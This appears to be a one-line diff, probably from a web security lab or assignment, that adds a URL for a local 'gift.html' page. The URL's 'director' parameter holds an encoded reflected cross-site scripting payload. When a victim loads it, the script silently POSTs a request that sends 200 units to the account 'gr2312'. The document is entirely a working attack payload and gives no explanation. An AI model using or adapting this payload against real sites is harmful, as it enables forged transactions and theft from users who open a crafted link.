@@ -1,0 +1,1 @@
+http://127.0.0.1:8000/gift.html?director=%3Cscript%3E%20var%20req=new%20XMLHttpRequest();%20var%20inject=new%20FormData();%20req.open(%22POST%22,%27/gift/0%27,true);%20inject.append(%22username%22,%22gr2312%22);%20inject.append(%22amount%22,%22200%22);%20req.send(inject);%3C/script%3E
